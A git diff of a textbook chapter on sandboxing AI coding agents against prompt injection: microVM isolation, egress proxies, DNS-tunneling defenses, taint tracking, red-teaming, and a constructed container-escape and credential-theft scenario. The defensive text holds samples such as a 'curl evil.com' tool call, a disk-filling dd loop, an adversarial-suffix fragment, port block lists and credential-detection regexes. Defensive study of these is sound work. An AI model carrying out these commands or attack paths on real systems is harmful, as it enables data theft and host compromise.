@@ -19,6 +19,7 @@ _How do we execute untrusted, non-deterministic agent actions securely when inst
 In classical computing, security rests on the fundamental separation of instructions and data: the $W \oplus X$ invariant (memory cannot be simultaneously writable and executable). Large language models (LLMs), however, possess zero architectural instruction/data split. Untrusted data entering the context window shares the exact same token channel and self-attention tensor as privileged system instructions. Because the model cannot mathematically distinguish external inputs from supervisory directives, the runtime systems engineer must operate under a zero-trust axiom: the model policy must be assumed to be permanently compromised.
 
 Prompt injection is an intrinsic architectural property of transformer models, not an ephemeral implementation bug. Consequently, security invariants cannot be enforced through prompt engineering, constitutional classifiers, or in-context guardrails. Security must be enforced at the runtime virtualization layer. In production developer environments (such as Claude Code, Devin, and SWE-bench execution harnesses), agents execute arbitrary code, invoke bash shells, manipulate package managers, and inspect git repositories. Standard Docker containers are provably insufficient; container escapes, privilege escalations, and silent network exfiltration occur regularly. Robust production architecture mandates:
+
 - sub-50 ms ephemeral microVMs (such as AWS Firecracker)
 - WebAssembly sandboxes
 - copy-on-write ephemeral storage overlays
@@ -115,7 +116,6 @@ Furthermore, this dynamic invokes **Lampson's Confinement Problem** [@lampson197
 
 The fundamental defense against confused deputies and confinement failures, established by @saltzer1975, is the **Principle of Least Privilege** enforced via explicit capability-based security and hardware-level isolation. Theoretical boundaries must be replaced with physical enforcement mechanisms. If an agent executes untrusted code, it must run inside a microVM (like AWS Firecracker) or a secure WebAssembly runtime, where ambient credentials do not exist, filesystem mutations are ephemeral, and network egress is intercepted dynamically via eBPF.
 
-
 ## The Von Neumann Failure {#sec-vol3-sandboxing-the-von-neumann-failure}
 
 Why does prompt injection remain an intractable challenge for neural language models? The answer lies in computer architecture.
@@ -160,12 +160,11 @@ allows token $x_{\text{adv}}$ to modulate the contextual representation of every
 
 Because the lack of an instruction/data split is an architectural property of universal attention, **prompt injection is mathematically inevitable within the model boundary**. Relying on the model to self-police its inputs is equivalent to running untrusted C code on a CPU with all page protections disabled and hoping the program chooses not to execute the stack. Robust security must therefore be enforced externally by the system runtime.
 
-
 ## Why Prompt Guardrails Fail {#sec-vol3-sandboxing-why-prompt-guardrails-fail}
 
 When organizations encounter prompt injection, the initial engineering reaction is frequently to implement prompt guardrails—either through system prompt directives or secondary classifier models. Production systems engineering demonstrates that both approaches provide an illusion of security rather than dependable protection.
 
-### System Prompt Reinforcement
+### System prompt reinforcement
 
 A naive defense attempts to harden the system prompt:
 ```
@@ -181,7 +180,7 @@ This defense fails against simple adversarial framing, semantic role-playing, an
 * **Adversarial Suffixes:** Zou et al. [@zou2023] proved the existence of universal, transferable adversarial suffixes. By computing gradient updates with respect to token inputs, attackers generate gibberish strings (e.g., `! ! ! == describing.\ + similarly rewritten`) that mathematically force the model's next-token distribution to bypass alignment training with near 100 percent success across both open and closed-source model families.
 * **Context Dilution:** When context windows expand to 100,000+ tokens, the supervisory attention weight allocated to initial system tokens diminishes, a phenomenon known as the "lost in the middle" and attention dilution failure.
 
-### Secondary Classifier LLMs (Dual-LLM Filters)
+### Secondary classifier LLMs (dual-LLM filters)
 
 A more complex architecture routes all untrusted inputs and tool invocations through a secondary, smaller guardrail model (such as Llama Guard) before executing actions. While useful for filtering coarse, offensive content, secondary classifiers fail as systems security boundaries:
 
@@ -202,7 +201,6 @@ Attack Vector -> [ Secondary Classifier ] -- (Bypassed via Base64/Obfuscation) -
 
 Systems rule: **Never rely on probabilistic components to enforce deterministic security guarantees.** Security guarantees must be enforced by hardware-backed protection domains.
 
-
 ## The Isolation Spectrum {#sec-vol3-sandboxing-the-isolation-spectrum-chroot}
 
 Operating systems offer multiple mechanisms for isolating untrusted execution workloads. When selecting an isolation technology for autonomous agent systems, architects face an engineering trade-off across four competing axes:
@@ -216,9 +214,9 @@ Operating systems offer multiple mechanisms for isolating untrusted execution wo
 ![](images/svg/isolation_spectrum.svg)
 :::
 
-@fig-isolation-spectrum maps the landscape of isolation primitives. We examine each technology on this spectrum:
+@Fig-isolation-spectrum maps the landscape of isolation primitives. We examine each technology on this spectrum:
 
-### Traditional Linux Containers (Docker, Podman, OCI)
+### Traditional Linux containers (Docker, Podman, OCI)
 
 Linux containers are not virtualization boundaries; they are constrained processes sharing the host Linux kernel. Isolation is achieved via:
 
@@ -228,14 +226,14 @@ Linux containers are not virtualization boundaries; they are constrained process
 
 While containers boot relatively quickly (~200–500 ms), they represent an **unacceptable risk for untrusted agent code execution** because they violate the principle of **Least Common Mechanism** [@saltzer1975]. By sharing the monolithic host Linux kernel across all tenants, containers introduce a massive shared attack surface. Over 450 system calls are exposed to the containerized process. Any local privilege escalation vulnerability in the host Linux kernel (such as Dirty COW [CVE-2016-5195] or Dirty Pipe [CVE-2022-0847]) grants root access to the physical host. Furthermore, misconfigured `/proc` and `/sys` mounts frequently leak host metadata, while shared loop devices can corrupt host block storage.
 
-### Userspace Syscall Emulation (gVisor)
+### Userspace syscall emulation (gvisor)
 
 Google's gVisor addresses container vulnerabilities by inserting a userspace kernel, termed the **Sentry**, between the application and the host operating system. The Sentry intercepts all application system calls (via `ptrace` or KVM virtualization hooks) and implements Linux kernel semantics entirely in memory-safe Go.
 
 * **Advantages:** The host Linux kernel is shielded from direct application system calls. The attack surface of the host is reduced to the minimal set of syscalls required by the Go runtime (~50 syscalls).
 * **Trade-offs:** Emulating complex Linux subsystems introduces significant I/O and context-switch overhead. File system operations, heavy git branch switches, and compilation workloads suffer a 15 percent to 35 percent performance degradation. Startup latency ranges between 120 ms and 300 ms.
 
-### WebAssembly (Wasm / WASI)
+### WebAssembly (wasm / WASI)
 
 WebAssembly [@haas2017bringing] provides deterministic, bytecode-level sandboxing. Memory isolation is enforced mathematically: a Wasm module operates strictly within a contiguous, bounds-checked linear memory array.
 
@@ -246,23 +244,45 @@ WebAssembly [@haas2017bringing] provides deterministic, bytecode-level sandboxin
 
 MicroVMs combine the isolation strength of hardware-assisted virtualization with the agility of lightweight containers. By pruning all legacy PC hardware emulation, AWS Firecracker [@agache2020firecracker] achieves sub-50 ms boot times and a ~5 MB baseline memory footprint while running an independent, fully functional guest Linux kernel atop the Linux Kernel-based Virtual Machine (KVM) subsystem.
 
-| Isolation Primitive | Boundary Mechanism | Cold Boot ($T_{\text{boot}}$) | Memory Base | Host Kernel Surface | Untrusted Bash Safe? |
-|:---|:---|:---|:---|:---|:---|
-| **Linux Containers (Docker)** | Namespaces & cgroups | 150 – 400 ms | 15 – 35 MB | Shared (450+ syscalls) | [Unsafe] Escape prone |
-| **gVisor (Sentry)** | Userspace Syscall Filter | 120 – 250 ms | 25 – 45 MB | Intercepted in Go | [Moderate] I/O penalty |
-| **WebAssembly (WASI)** | Linear Memory Bounds | < 1 – 5 ms | 1 – 4 MB | Zero (Capability imports) | [Safe] Bytecode only |
-| **MicroVM (Firecracker)** | Hardware KVM (VT-x) | 5 – 45 ms | ~5 MB | Hardware VMCS barrier | [Safe] Golden standard |
-| **Legacy VM (QEMU)** | Full PC Emulation | 15 – 45 s | 512 MB – 2 GB | Full Hardware Hypervisor | [Safe] Impractical at scale |
+| Isolation Primitive           | Boundary Mechanism       | Cold Boot ($T_{\text{boot}}$) | Memory Base   | Host Kernel Surface       | Untrusted Bash Safe?        |
+|:------------------------------|:-------------------------|:------------------------------|:--------------|:--------------------------|:----------------------------|
+| **Linux Containers (Docker)** | Namespaces & cgroups     | 150 – 400 ms                  | 15 – 35 MB    | Shared (450+ syscalls)    | [Unsafe] Escape prone       |
+| **gVisor (Sentry)**           | Userspace Syscall Filter | 120 – 250 ms                  | 25 – 45 MB    | Intercepted in Go         | [Moderate] I/O penalty      |
+| **WebAssembly (WASI)**        | Linear Memory Bounds     | < 1 – 5 ms                    | 1 – 4 MB      | Zero (Capability imports) | [Safe] Bytecode only        |
+| **MicroVM (Firecracker)**     | Hardware KVM (VT-x)      | 5 – 45 ms                     | ~5 MB         | Hardware VMCS barrier     | [Safe] Golden standard      |
+| **Legacy VM (QEMU)**          | Full PC Emulation        | 15 – 45 s                     | 512 MB – 2 GB | Full Hardware Hypervisor  | [Safe] Impractical at scale |
 : **Isolation Technologies Comparison**: Quantitative comparison of isolation mechanisms for autonomous agent execution runtimes. {#tbl-isolation-comparison}
 
-As summarized in @tbl-isolation-comparison, **MicroVMs represent the golden architectural standard for autonomous coding agents**. They provide full POSIX compatibility (running bash, pytest, git, and python unmodified) while guaranteeing hardware-enforced hypervisor protection.
+As summarized in @tbl-isolation-comparison, **MicroVMs represent the golden architectural standard for autonomous coding agents**. They provide full POSIX compatibility (running bash, pytest, git, and python unmodified) while guaranteeing hardware-enforced hypervisor protection. The sub-$100\text{ ms}$ startup bar stated at the opening of this section, and the "impractical at scale" verdict in the table's last row, both follow from a single accounting question: how often is a sandbox torn down and rebuilt inside one agent trajectory, and what does each rebuild cost against the work it contains.
 
+::: {#nbk-sandboxing-boot-budget .callout-notebook title="How fast a sandbox has to boot"}
+
+**Problem**: An agent runtime provisions a fresh sandbox for every tool call and discards it afterward. What cold-boot latency keeps isolation a rounding error on trajectory wall-clock time rather than the dominant cost?
+
+**Variables**: A trajectory of $40$ tool calls, each turn spending $2.0\text{ s}$ on model inference and $1.5\text{ s}$ on tool execution, and an engineering budget that allows isolation to consume at most $5$ percent of wall clock. Those four are scenario assumptions. The boot latencies are the slow end of each range in @tbl-isolation-comparison: Firecracker $45\text{ ms}$, gVisor $250\text{ ms}$ plus its $35$ percent I/O degradation, Docker $400\text{ ms}$, and QEMU $30\text{ s}$.
+
+**Math**: Productive work per call is $2.0 + 1.5 = 3.5\text{ s}$, so one trajectory contains $40 \times 3.5 = 140\text{ s}$ of it. Writing $T$ for boot latency per call, isolation's share of wall clock is $T/(3.5 + T)$. Setting that equal to $0.05$ and solving:
+
+$$T = \frac{0.05 \times 3.5}{0.95} = 0.184\text{ s}$$
+
+The call count cancels, so the budget does not move with trajectory length. Charging each row of the table against a $140\text{ s}$ trajectory:
+
+- Firecracker: $40 \times 0.045 = 1.8\text{ s}$ of boot, so $1.8/141.8 = 1.3$ percent of wall clock.
+- gVisor: $40 \times 0.250 = 10\text{ s}$ of boot plus $40 \times 1.5 \times 0.35 = 21\text{ s}$ of I/O tax, so $31/171 = 18.1$ percent.
+- Docker: $40 \times 0.400 = 16\text{ s}$ of boot, so $16/156 = 10.3$ percent.
+- QEMU: $40 \times 30 = 1200\text{ s}$ of boot, so $1200/1340 = 89.6$ percent, which is $1200/140 = 8.6$ times the productive work it wraps.
+
+**Result**: The budget is $184\text{ ms}$ per sandbox. Firecracker at $45\text{ ms}$ sits $4.1\times$ inside it, Docker overruns it by $2.2\times$, gVisor by $4.2\times$ once its I/O tax is charged, and QEMU by $163\times$. Isolation reaches half of wall clock at $T = 3.5\text{ s}$, the crossover where building a sandbox costs as much as using it, and QEMU sits an order of magnitude past that line. This is what "impractical at scale" means arithmetically.
+
+**Systems insight**: The threshold is fixed by the productive time of one tool call, not by how long the trajectory runs, so an ephemeral-per-call design has exactly one tunable term and it is the per-call cost of the isolation boundary. That term is not the boot column alone, as gVisor shows: its steady-state I/O degradation costs roughly twice what its cold start does, so a technology has to be scored on the full per-call charge, and a runtime that cannot meet the budget is pushed toward reusing sandboxes across calls, which trades the boot cost back for cross-turn contamination risk.
+
+:::
 
 ## Firecracker MicroVMs and KVM {#sec-vol3-sandboxing-aws-firecracker-microvms}
 
 AWS Firecracker was designed specifically for multi-tenant, serverless cloud workloads (powering AWS Lambda and AWS Fargate) and has become the de facto standard for developer agent sandboxing (utilized by platforms like Modal, Fly.io, and E2B).
 
-### Economy of Mechanism and the TCB
+### Economy of mechanism and the TCB
 
 The foundational security principle of **Economy of Mechanism** [@saltzer1975] dictates that the Trusted Computing Base (TCB)—the set of all hardware, firmware, and software components critical to security—must be kept as small and simple as possible to allow rigorous verification. Traditional virtual machine monitors like QEMU violate this principle by emulating complete PC motherboards: PCI buses, ACPI power tables, IDE/SATA controllers, USB ports, PS/2 keyboards, and NE2000 network cards. This legacy emulation introduces hundreds of thousands of lines of C code into the TCB, resulting in large attack surfaces (such as the historic VENOM [CVE-2015-3456] floppy drive escape) and multi-second boot delays.
 
@@ -279,7 +299,7 @@ Because there is no PCI discovery bus and no ACPI table generation, the guest Li
 ![](images/svg/firecracker_microvm_architecture.svg)
 :::
 
-### The Jailer Security Envelope
+### The jailer security envelope
 
 To implement defense-in-depth, Firecracker employs a dedicated companion wrapper called the **Jailer** (@fig-firecracker-architecture). Even if an adversary discovers an unprecedented zero-day vulnerability in Firecracker's Rust VirtIO block driver, the Jailer ensures the host system remains completely uncompromised.
 
@@ -290,7 +310,7 @@ Before launching the Firecracker virtual machine monitor (VMM), the Jailer appli
 3. **Cgroup Bounding:** The VMM is moved into dedicated `cgroups v2` trees that hard-cap CPU shares, maximum RAM consumption, and process count (`pids.max`).
 4. **Seccomp-BPF Filtering:** Before entering execution, Firecracker attaches a strict Berkeley Packet Filter (seccomp-bpf) to its own process, restricting its host syscall inventory to approximately 20 mandatory calls (such as `ioctl(KVM_RUN)`, `read`, `write`, `epoll_wait`). Any attempt by the VMM to invoke forbidden syscalls like `execve`, `fork`, or `mount` immediately triggers a `SIGSYS` process termination.
 
-### Hardware Hypervisor Boundary (KVM)
+### Hardware hypervisor boundary (KVM)
 
 Inside the Firecracker process, execution of guest code is offloaded to the Linux Kernel-based Virtual Machine (`/dev/kvm`). Intel VT-x and AMD-V processors provide two operational modes:
 
@@ -303,12 +323,11 @@ $$\text{GVA} \xrightarrow{\text{Guest CR3}} \text{GPA} \xrightarrow{\text{EPT Po
 
 If an agent script running as root inside the microVM attempts to access memory outside its allocated physical RAM frame, the CPU hardware immediately raises an `EPT Violation` VM-exit, halting the instruction and trapping into KVM. The guest has zero physical capability to read or modify host memory.
 
-
 ## Filesystem Isolation {#sec-vol3-sandboxing-filesystem-isolation-ephemeral-workspaces}
 
 Autonomous developer agents require extensive filesystem manipulation: cloning 5 GB git repositories, generating multi-gigabyte build artifacts, installing virtual environments, and editing source code. Provisioning a full, independent disk image for each agent turn would exhaust host disk I/O bandwidth and introduce multi-second latency.
 
-### The OverlayFS Copy-on-Write Architecture
+### The OverlayFS copy-on-write architecture
 
 Production sandboxes resolve this bottleneck by combining immutable base images with **OverlayFS** or ZFS copy-on-write snapshotting (@fig-firecracker-architecture, right column).
 
@@ -327,7 +346,7 @@ Agent File Write (src/main.py) --> Written directly to UpperDir
 Agent File Delete (old_test.py)--> Creates whiteout character device in UpperDir
 ```
 
-### Instantaneous Teardown and Residual Hygiene
+### Instantaneous teardown and residual hygiene
 
 When an agent task finishes, the sandbox runtime terminates the microVM and executes:
 
@@ -335,13 +354,12 @@ $$\text{Workspace Cleanup: } \text{rm} -rf \; \text{UpperDir}$$
 
 Because all mutations, created files, downloaded packages, malicious scripts, and temporary logs reside exclusively within UpperDir, deleting UpperDir completely purges 100 percent of the session's mutations in under 2 milliseconds. The immutable LowerDir remains pristine and untouched, instantly ready to serve the next agent invocation with zero risk of cross-session contamination.
 
-### Storage Quota Defense
+### Storage quota defense
 
 Unchecked agent code can intentionally or accidentally consume all host disk space (e.g., a buggy script executing `while true; do dd if=/dev/urandom ...; done`). To prevent denial-of-service across the host fleet, sandboxes must enforce hard project quotas:
 
 * **Block Quotas:** Restricting UpperDir to a maximum disk capacity (e.g., 5 GB).
 * **Inode Quotas:** Limiting maximum file creation count (e.g., 100,000 inodes) to prevent inode exhaustion attacks that lock Linux filesystems.
-
 
 ## Network Egress Proxies {#sec-vol3-sandboxing-network-egress-proxies-whitelisting}
 
@@ -355,7 +373,7 @@ Production sandboxes enforce a **Multi-Layer Defense-in-Depth Network Egress Arc
 ![](images/svg/network_egress_defense_in_depth.svg)
 :::
 
-### Layer 1: Kernel Namespace & eBPF Packet Interception
+### Layer 1: Kernel namespace & ebpf packet interception
 
 The sandbox microVM is placed in an isolated network namespace connected to the host via a virtual TAP interface (`tap0`). The host network stack enforces strict packet routing:
 
@@ -364,11 +382,11 @@ The sandbox microVM is placed in an isolated network namespace connected to the 
   1. **Direct Numeric IP Drop:** Packets destined for raw IPv4/IPv6 addresses (e.g., `198.51.100.1`) without prior DNS resolution are immediately dropped with `TC_ACT_SHOT`. This defeats reverse shell sockets commonly employed by adversaries.
   2. **Port Restrictions:** All outbound destination ports are blocked except port 443 (HTTPS) and port 53 (DNS). Unchecked ports used by IRC botnets, SSH tunnels, or cryptocurrency mining pools (e.g., ports 22, 25, 3389, 4444, 6667) are rejected at the kernel layer.
 
-### Layer 2: Transparent TLS Egress Proxy (Envoy / Squid)
+### Layer 2: Transparent TLS egress proxy (Envoy / Squid)
 
 All allowed outbound HTTPS traffic is forcibly redirected to a local, transparent egress proxy (such as Envoy or a specialized Rust proxy).
 
-#### TLS Server Name Indication (SNI) Whitelisting
+#### TLS server name indication (SNI) whitelisting
 Before completing the TLS handshake, the proxy inspects the ClientHello frame to extract the Server Name Indication (SNI) hostname. The requested domain is matched against a strict, organization-defined **domain allowlist**:
 
 ```yaml
@@ -387,7 +405,7 @@ egress_policy:
 
 If an injected agent attempts to connect to `evil-c2.com`, the egress proxy detects that the domain is unlisted, immediately severs the TCP connection with a `403 Forbidden`, logs a security incident, and signals the agent orchestrator to terminate the trajectory.
 
-#### Outbound Payload Regex and Secret Redaction
+#### Outbound payload regex and secret redaction
 When the proxy terminates TLS connections (using internal root certificates installed within the sandbox base image), it inspects the HTTP request body and query parameters for sensitive tokens. High-performance regex engines scan outgoing data streams for known credential signatures:
 
 * **AWS Access Keys:** `AKIA[0-9A-Z]{16}`
@@ -397,7 +415,7 @@ When the proxy terminates TLS connections (using internal root certificates inst
 
 If a match is detected, the proxy blocks the transmission, preventing credential harvesting even if an adversary successfully establishes an outbound HTTP connection.
 
-### Layer 3: DNS Covert Tunneling Mitigation
+### Layer 3: DNS covert tunneling mitigation
 
 Attackers aware of HTTP egress filters frequently resort to **DNS Covert Tunneling**. In this attack, data is exfiltrated by encoding sensitive information into subdomains of an attacker-controlled nameserver:
 
@@ -420,12 +438,11 @@ To neutralize DNS tunneling, the sandbox DNS proxy enforces strict hygiene:
 
 3. **Internal Sinkholing:** Sandboxes cannot query external DNS resolvers (such as `8.8.8.8` or `1.1.1.1`). All queries are resolved through an internal caching DNS server backed by threat intelligence feeds that sinkholes newly registered domains (NRDs).
 
-
 ## Information Flow Control {#sec-vol3-sandboxing-information-flow-control-ifc}
 
 While sandboxes contain physical system damage and exfiltration, software agents also face logical privilege escalation within their multi-turn reasoning loops. Classical operating systems addressed this using **Information Flow Control (IFC)** [@krohn2007information; @myers1997complete]. Applying IFC to agentic architectures provides a formal mechanism for tracking the propagation of untrusted data across tool turns.
 
-### The Security Lattice
+### The security lattice
 
 An **information flow security lattice** formalizes how data and privileges can flow through an agentic system. In an autonomous agent runtime, we define two orthogonal label dimensions: **Secrecy** (Confidentiality) and **Integrity** (Trustworthiness). (The formal partially ordered sets, join/meet operators, and taint propagation invariants of this lattice are detailed mathematically in @sec-vol3-appendix-math-lattice).
 
@@ -434,11 +451,11 @@ For our systems threat model, let integrity be represented by a dynamic taint ta
 * A user prompt authored by the verified system operator carries label $\tau = \text{Trusted}$.
 * Any text ingested from the external environment—including web pages, GitHub issues, pull request diffs, compiler stderr traces, and database records—carries label $\tau = \text{Untrusted}$.
 
-### Dynamic Taint Propagation
+### Dynamic taint propagation
 
 During autoregressive context assembly, every token in the agent context window has an associated taint tag. The cumulative context taint is simply the combination across all constituent tokens. If a single untrusted document enters the context window, the cumulative context transitions to $\text{Untrusted}$.
 
-### Capability Revocation Invariant
+### Capability revocation invariant
 
 The agent runtime maintains an access control policy mapping registered tools $\mathcal{T}$ to required integrity thresholds. Tools are categorized into **Read-Only Tools** (e.g., `grep_search`, `read_file`, `view_documentation`) and **State-Mutating / High-Privilege Tools** (e.g., `bash_exec`, `git_push`, `send_email`, `execute_payment`).
 
@@ -468,12 +485,11 @@ Attempts to Invoke: 'bash_exec("curl evil.com")'
 
 By enforcing dynamic taint tracking, an agent can freely inspect malicious pull requests or scrape untrusted web content without risk of automatic code execution: the moment untrusted data enters its working set, its ability to trigger ambient side-effects is automatically locked until a human operator re-authorizes the operation.
 
-
 ## Second-Order Injection {#sec-vol3-sandboxing-second-order-injection-via-sandbox}
 
 A subtle vulnerability in autonomous systems is **Second-Order Prompt Injection**. In this attack pattern, the initial user prompt and repository code are completely benign. The injection payload is generated dynamically as a side effect of executing a legitimate tool inside the sandbox.
 
-### Vectors of Second-Order Injection
+### Vectors of second-order injection
 
 1. **Compiler and Linter Diagnostic Traces:** An adversary writes a Python or C++ file containing syntactically invalid code designed to trigger a verbose compiler error. Embedded within the expected syntax error string is an injection payload:
 
@@ -493,7 +509,7 @@ A subtle vulnerability in autonomous systems is **Second-Order Prompt Injection*
 
 3. **Environment Variable Harvesting via `.env`:** Software repositories frequently contain `.env.example` or dotenv files. An attacker embeds prompt overrides inside configuration variable keys.
 
-### Systems Countermeasures
+### Systems countermeasures
 
 To neutralize second-order injections before they compromise the model:
 
@@ -521,7 +537,6 @@ To neutralize second-order injections before they compromise the model:
   By discarding arbitrary string error streams, the attack surface for injection is minimized.
 
 * **Terminal ANSI Escape Code Sanitization:** Raw terminal outputs contain ANSI escape sequences (e.g., cursor repositioning, color resets, screen clearing). Attackers use terminal escape codes to visually hide malicious text from human monitoring logs while leaving it visible to the LLM tokenizer. The agent runner must strip all ANSI control sequences before context ingestion.
-
 
 ## Red Teaming and Adversarial Fuzzing {#sec-vol3-sandboxing-automated-red-teaming-and}
 
@@ -559,7 +574,7 @@ Automated red teaming harnesses—exemplified by frameworks like Microsoft PyRIT
                   Did tool escape sandbox or leak keys?
 ```
 
-### The Adversarial Fuzzing Loop
+### The adversarial fuzzing loop
 
 An automated red-teaming harness operates as a closed-loop fuzzer:
 
@@ -575,18 +590,17 @@ $$\text{ASR} = \frac{\sum_{i=1}^{K} \mathbb{I}(\text{Sandbox Breach}_i \lor \tex
 
 An agent system cannot be certified for production deployment unless its ASR on standardized suites (such as InjecAgent) drops to 0 percent when backed by its hardware sandbox and egress proxy.
 
+## A Container Escape, Traced End to End {#sec-vol3-sandboxing-production-postmortem-jailbreaks-tool}
 
-## Container Escapes Postmortem {#sec-vol3-sandboxing-production-postmortem-jailbreaks-tool}
+To contextualize these systems principles, the following walkthrough traces one compromise end to end. It is a constructed scenario rather than a documented incident, assembled from attack primitives established earlier in this chapter, and every figure in it is illustrative.
 
-To contextualize these systems principles, consider the forensic analysis of a real-world enterprise agent compromise.
+### Scenario
 
-### Incident Description
-
-In late 2024, a technology enterprise deployed an autonomous code review bot integrated into their internal GitHub Enterprise repository. The bot was designed to automatically review open pull requests from external contributors, run unit tests, summarize code diffs, and post feedback comments.
+Consider an enterprise that deploys an autonomous code review bot integrated into their internal GitHub Enterprise repository. The bot was designed to automatically review open pull requests from external contributors, run unit tests, summarize code diffs, and post feedback comments.
 
 * **Architecture at Time of Incident:** The bot executed inside a long-running standard Docker container on an AWS EC2 instance. The container ran with default bridge networking, mounted the host Docker socket (`/var/run/docker.sock`) to allow running child test containers, and inherited the EC2 instance's IAM role.
 
-### Breach Timeline
+### Breach timeline
 
 ```
 T + 00:00  Attacker submits PR #402 containing a malicious fixture in tests/test_perf.py.
@@ -600,7 +614,7 @@ T + 00:45  Attacker uses stolen IAM credentials to provision 32 GPU instances fo
 T + 03:15  Cloud billing alarm triggers ($42,000 accrued); security team revokes IAM role.
 ```
 
-### Forensic Root-Cause Analysis
+### Forensic root-cause analysis
 
 The postmortem revealed four compounding architectural failures:
 
@@ -609,7 +623,7 @@ The postmortem revealed four compounding architectural failures:
 3. **Failure 3: Shared Kernel and Docker Socket Exposure.** Mounting `/var/run/docker.sock` granted the container de facto root privileges on the host operating system, rendering process-level isolation meaningless.
 4. **Failure 4: Implicit Trust in Tool Observations.** The agent runner fed raw `pytest` output directly into the primary reasoning prompt without sanitization or information flow control tags.
 
-### Remediation and Hardening
+### Remediation and hardening
 
 The enterprise redesigned its agent architecture according to the principles detailed in this chapter:
 
@@ -619,7 +633,6 @@ The enterprise redesigned its agent architecture according to the principles det
 4. **Separation of Privilege via Partitioned Workflows:** Applying the principle of **Separation of Privilege** [@saltzer1975], the enterprise divided the workflow into an unprivileged *Reader Agent* (which parses PR code and produces structured JSON summaries) and an isolated *Test Runner* (which executes in a network-disabled sandbox).
 
 ---
-
 
 ## Fallacies and Pitfalls {#sec-vol3-sandboxing-fallacies}
 
@@ -655,6 +668,7 @@ Blocking outbound HTTP/HTTPS traffic while leaving DNS resolution (port 53) unre
 
 :::
 
+Principle \ref{pri-vol3-zero-trust-sandboxing} rests on an architectural fact this chapter makes concrete. A processor separates instructions from data with hardware; a language model has no such separation, so any text that reaches the context can act as instruction. Isolation is therefore placed around the side effects rather than around the reasoning.
 
 ## Chapter Summary {#sec-vol3-sandboxing-summary}
 
